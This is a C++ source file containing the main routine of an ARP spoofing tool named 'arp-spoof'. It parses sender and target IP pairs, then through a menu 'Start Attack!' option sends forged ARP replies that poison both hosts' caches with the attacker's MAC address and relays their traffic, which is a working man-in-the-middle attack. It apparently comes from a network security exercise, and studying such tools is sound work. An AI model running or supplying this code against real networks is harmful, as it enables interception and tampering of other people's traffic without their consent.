#include "pch.h"
#include "send_arp.h"
#include "mac.h"
#include "ip.h"
#include "pthread.h"
#include <signal.h>

void usage()
{
	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2n");
}

int main(int argc, char *argv[])
{
	print_logo();
	signal(SIGINT, sigint_handler);
	if (argc < 4 || argc % 2 == 1)
	{
		usage();
		return -1;
	}
	u_int8_t attacker_mac[6];
	u_int8_t sender_mac[6];
	u_int8_t target_mac[6];
	u_int8_t broad_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
	u_int8_t empty_mac[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

	u_int8_t attacker_ip[4];
	u_int8_t sender_ip[4];
	u_int8_t target_ip[4];

	char *dev = argv[1];
	char *result;
	my_mac(dev, attacker_mac);
	s_getIpAddress(dev, attacker_ip);

	int count = (argc - 2) / 2;
	list *targets = (list *)malloc(sizeof(list) * count);
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *pcap = pcap_open_live(dev, 65536, 1, 1, errbuf);
	if (pcap == nullptr)
	{
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	for (int i = 0; i < count; i += 1)
	{
		argv_ip(argv[2 * i + 2], targets[i].sender_ip);
		argv_ip(argv[2 * i + 3], targets[i].target_ip);
	}
	int todo_choice;
	printf("What do to?\n");
	while (1)
	{
		printf("1. Start Attack!\n");
		printf("2. Add flow info\n");
		printf("3. View flow info\n");
		printf("4. Exit\n");
		scanf("%d", &todo_choice);
		if (todo_choice == 1)
		{
			sleep(10);
			for (int i = 0; i < count; i++)
			{
				request(dev, pcap, broad_mac, attacker_mac, attacker_mac, attacker_ip, empty_mac, targets[i].target_ip, htons(ArpHdr::Request));
				reply(dev, pcap, targets[i].target_mac, targets[i].target_ip);
				request(dev, pcap, broad_mac, attacker_mac, attacker_mac, attacker_ip, empty_mac, targets[i].sender_ip, htons(ArpHdr::Request));
				reply(dev, pcap, targets[i].sender_mac, targets[i].sender_ip);
				request(dev, pcap, targets[i].sender_mac, attacker_mac, attacker_mac, targets[i].target_ip, targets[i].sender_mac, targets[i].sender_ip, htons(ArpHdr::Reply));
				request(dev, pcap, targets[i].target_mac, attacker_mac, attacker_mac, targets[i].sender_ip, targets[i].target_mac, targets[i].target_ip, htons(ArpHdr::Reply));
			}
			printf("press any key to stop .. \n");
			relay(dev, pcap, attacker_mac, targets, count);
		}
		else if (todo_choice == 2)
		{
			add_flow(targets, &count);
		}
		else if (todo_choice == 3)
		{
			view_flow(targets, count);
		}
		else if (todo_choice == 4)
		{
			free(targets);
			pcap_close(pcap);
			exit(0);
		}
	}
	pcap_close(pcap);
	return 0;
}
